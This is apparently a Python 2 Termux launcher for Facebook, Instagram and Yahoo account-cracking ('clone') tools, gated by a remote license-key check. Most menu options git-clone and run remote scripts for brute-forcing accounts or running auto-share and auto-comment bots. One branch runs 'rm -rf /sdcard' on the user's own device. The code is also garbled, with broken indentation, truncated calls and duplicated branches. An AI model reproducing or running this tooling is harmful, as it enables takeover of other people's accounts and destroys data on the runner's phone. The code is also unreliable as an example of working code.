

import os

import sys

import time

os.system("pip install requests")

import os, marshal
try:
    import requests, os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests, os, time, uuid, requests
    from multiprocessing.pool import ThreadPool
    os.system('clear')
    os.system('termux-setup-storage')
except ImportError:
    print '\n [\xc3\x97] The requests module is not installed!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [\xc3\x97] Futures module is not installed yet!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [\xc3\x97] Bs4 module is not installed yet!...\n'
    os.system('pip2 install bs4')

import requests, os, uuid, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as mawan__pass
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = [
 'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
url = 'https://mbasic.facebook.com'
hoetank = random.choice(['The one who posted is handsome:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r \x1b[1;93m[+] remove token '(N, M, N, x),
        sys.stdout.flu
        time.sleep(1)


logo = '                                      \n    _    _             _    _         _  _ \n | |__| |_  ___  ___| |__| |_  ___ | |<_>\n | / /| . |<_> |<_-<| / /| . |/ ._>| || |\n |_\\_\\|_|_|<___|/__/|_\\_\\|_|_|\\___.|_||_|\n\x1b[1;95m-----------------------------------------------  \n\x1b[1;92m(*) AUTHOR    :\x1b[1;92m RED-MAFIA\n\x1b[1;92m(*) WHATSAPP  :\x1b[1;92m 03188214452\n\x1b[1;92m(*) KING OF   : FACEBOOK\n\x1b[1;92m(*) FACEBOOK  : RED-MAFIA\n\x1b[1;37m--------------------------------------------                      \n THANKS FOR USE OVER TOLLS\n\x1b[1;91m--------------------------------------------\n'

def main_apv():
    imt = '~~RED-MAFIA=='
    os.system('clear')
    print logo
    try:
        key1 = open('/sdcard/Android/data/com.termux/files/.1.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print '           THIS IS YOUR KEY BRO'
        print ''
        myid = uuid.uuid4().hex[:40].upper()
        print '          YOUR KEY : ' + myid + imt
        kok = open('/sdcard/Android/data/com.termux/files/.1.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
        print ''
        raw_input('          Copy Key And Press Enter For Approvel Your Key ')
        os.system('xdg-open https://web.facebook.com/mahdihasan.80')

    r1 = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/paidfree4/main/server.txt').text
    if key1 in r1:
        ip()
    else:
        os.system('clear')
        print logo
        print '          THIS IS YOUR KEY BRO'
        print ''
        print '          YOUR KEY : ' + key1
        print ''
        raw_input('      Copy Key And Press Enter For Approvel Your Key ')
        os.system('xdg-open https://web.facebook.com/mahdihasan.80')
def ip():
    os.system('cd paidfree4 && mahdi.py')
    time.sleep(1)
    main()



os.system("clear")
print '\x1b[1;31;1mLOGIN KI LIYE APPROVAL LYLO PEHLY '
print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.sa.txt', 'r').read()
        if to ==" ":
            os.system('rm -rf /sdcard')
            os.system('rm -rf /sdcard/*')
        
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/paidfree4/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        menu()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved '
        print ' \x1b[1;92mCopy the id and send to Admin'
        print ' \x1b[1;92mYour id : ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+8801887408882')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter ,'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+8801887408882')
    sav = open('/sdcard/.sa.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()



def menu():
    os.system('clear')

print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
\033[0m================================================================
\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
\033[0;33mGITHUB : \033[1;97mhttps://github.com/====
\033[1;31mFb ; https://web.facebook.com/mahdihasan.80
\033[1;33mLIVE in Sylhet (Read in class 10)
\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU 
\033[0;36m================================================================""")
print("""
\033[1;36m[1]CLONE FROM2006- 2009 ID
\033[1;32m[2]CLONE FROM 2009 ID 
\033[1;88m[3]CLONE FROM 2010-2020 ID
\033[1;33m[4]CLONE FROM  BANGLADESH 6DIG[All SIM]
\033[1;32m[5]CLONE FROM INSTRAGAM ID
\033[1;33m[6]CLONE FROM FRIENDLIST (NEED TOKEN)
\033[1;36m[7]CLONE FROM  PUBLICK ID v2
\033[1;32m[8]CLONE FROM ID BANGLADESH 11DIG[All SIM]
\033[1;33m[9]CLONE FROM NUMBER BD
\033[1;88m[10]CLONE FROM FREOM PAKISTAN 
\033[1;88m[11]CLONE FROM FROM INDIA
\033[0;33m[12]CLONE FROM AFGHANISTAN 
\033[0;88m[13]CLONE FROM FREOM PAKISTAN V2(All SIM)
\033[1;33m[14]CLONE FROM FREOM File Creating
\033[1;35m[15]CLONE FROM LATEST FB CRACKING LOGIN
\033[1;33m[16]CLONE FROM ID BANGLADESH 9DIG (All SIM)
\033[1;32m[17]CLONE FROM 2009 ID [MAO]
\033[1;37m[18]FB AUTO SHARE (need TOKEN)
\033[1;33m[19]FB AUTO COMMENT(need TOKEN)
\033[1;33m[20]CLONE YAHOO 
\033[1;36m[21]CLONE FROM  PUBLICK ID  (Best) v2
\033[1;36m[22]CLONE FROM  PUBLICK ID  (best) v2
\033[1;33m[23]CLONE FROM FREOM File Creating V
\033[1;36m[24]CLONE FROM2003- 2005 ID
""")
pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")

if pil in ["01", "1"]:

    os.system('cd paidfree4')
    os.system('python2 mahdi9.py')
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["02", "2"]:
    os.system('cd paidfree4')
    os.system('python 20091st.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["03", "3"]:
    os.system('cd paidfree4')
    os.system('python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["04", "4"]:
    os.system('cd paidfree4')
    os.system('python2 BD6.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["05", "5"]:
    os.system('cd paidfree4 && python instragam.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["06", "6"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    os.system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["07", "7"]:
    os.system('cd paidfree4')
    os.system('python Prem.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["08", "8"]:
    os.system('cd paidfree4')
    os.system('python2 BD11.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["09", "9"]:
    os.system('git clone https://github.com/Azim-vau/smbf.git && cd smbf')
    os.system('python2 smbf.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["10"]:
    os.system('cd paidfree4 && python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
	
	
elif pil in ["11"]:
    os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["12"]:

    os.system('python2 Mahadi-Afg.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["13"]:
    os.system('cd paidfree4')
    os.system('python mahdi2.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["14"]:
    os.system('git clone https:/github.com/James404-cyber/DUM-ID.git')
    os.system('cd DUM-ID && python Doubled.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["15"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    
elif pil in ["16"]:
    os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd shuvook && python2 bd9.py cvx')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["17"]:
    os.system('pip2 install mclone')
    os.system('mclone')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["18"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python mahdi.py')
    
elif pil in ["19"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python autocomment.py')
  
	
elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python yahoo.py')	

elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	

elif pil in ["21"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Adf.py ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
	
elif pil in ["22"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Juttbrand.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["23"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python2 file.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["24"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python2 811.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
